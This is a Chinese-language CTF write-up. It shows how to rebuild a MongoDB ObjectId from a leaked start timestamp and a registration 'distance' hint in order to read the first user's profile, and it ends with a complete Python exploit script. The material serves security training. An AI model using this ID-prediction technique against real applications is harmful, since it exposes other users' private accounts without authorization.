# X-099-24
## 题目描述

> GetTheFirst is a web application that offers functionalities for users to register, log in, and view their profiles. The objective is to view the first user where you can find what your are looking for. The application provides the system's start timestamp stating that when first user was created.

## 知识点

- MongoDB ObjectId 结构：`[4字节时间戳][3字节机器标识][2字节进程标识][3字节自增计数]`，共 12 字节（24 个 hex 字符）。
- 信息泄露与可预测性：
  - `/starttime` 暴露了首个用户的 Unix 时间戳（即 ObjectId 的前 4 字节）。
  - `/register` 返回新注册用户的 `userId` 以及与目标用户计数差距 `distance`，据此可反推首个用户的计数部分。
- 组合以上两点，可直接拼出首个用户的完整 ObjectId。

## 解题思路

- 关键路径与参数：
  - 先 GET `/starttime` 拿到 `appStartTimestamp`（十进制）。
  - 再 POST `/register` 随便注册一个用户，响应里有：
    - `userId`（24 位 hex），可取其中：`machine = userId[8:14]`，`pid = userId[14:18]`，`counter_new = userId[18:24]`。
    - `distance`（整数），满足：`counter_new - counter_first = distance`。
  - 计算：`counter_first = counter_new - distance`。
  - 将 `starttime_hex = hex(appStartTimestamp)[2:].rjust(8, '0')` 与上面三段拼接：
    - `first_id = starttime_hex + machine + pid + counter_first_hex`（其中 `counter_first_hex` 需左补零到 6 位）。
  - 最后 GET `/profile/first_id`，即可读到 flag。

## 解题步骤

1. 访问 `http://ip3000/starttime` 获取首个用户时间戳，如：`1761730161`。
2. 注册一个用户：POST `http://ip3000/register`，`Content-Type: application/x-www-form-urlencoded`，例如：`username=ctfuser123&password=123456`。
3. 响应示例：
   ```json
   {
     "userId": "69142c47e3dca3301b9dc552",
     "userNumber": 2,
     "message": "User created successfully. Total users: 2",
     "maybehint": "You are 3 from your target user",
     "distance": 3
   }
   ```
   ![image.png](https://x/x12145830049.png)

4. 解析 `userId`：
   - `timestamp_new = 69142c47`
   - `machine = e3dca3`
   - `pid = 301b`
   - `counter_new = 9dc552`（hex -> int）
   - `distance = 3`
5. 反推 `counter_first = int(counter_new, 16) - distance = 0x9dc54f`，转 hex 并左补零至 6 位：`9dc54f`。
6. 将 `starttime = 1761730161` 转为 8 位 hex：`6901de71`。
7. 拼接 `first_id = 6901de71 + e3dca3 + 301b + 9dc54f = 6901de71e3dca3301b9dc54f`。
8. 访问 `http://ip3000/profile/6901de71e3dca3301b9dc54f`，页面显示：`FLAG`。
![image.png](https://x/x12145936588.png)
## EXP
```python
import requests
import re

base = "http://ip3000"
s = requests.Session()

# 1) 拿首个用户时间戳
starttime = int(s.get(base + "/starttime").text.strip())
start_hex = format(starttime, 'x').rjust(8, '0')

# 2) 注册一个用户拿 userId 和 distance
r = s.post(base + "/register",
           headers={"Content-Type": "application/x-www-form-urlencoded"},
           data="username=ctfuser123&password=123456")
j = r.json()
uid = j["userId"]
dist = int(j["distance"])

# 3) 解析 ObjectId 各字段
machine = uid[8:14]
pid = uid[14:18]
counter_new_hex = uid[18:24]
counter_new = int(counter_new_hex, 16)

# 4) 反推首用户计数并拼接 first_id
counter_first = counter_new - dist
counter_first_hex = format(counter_first, 'x').rjust(6, '0')
first_id = start_hex + machine + pid + counter_first_hex

# 5) 访问 profile 拿 flag
html = s.get(base + "/profile/" + first_id).text
flag = re.search(r"FLAG\{.*?\}", html)
print(flag.group(0) if flag else html)
```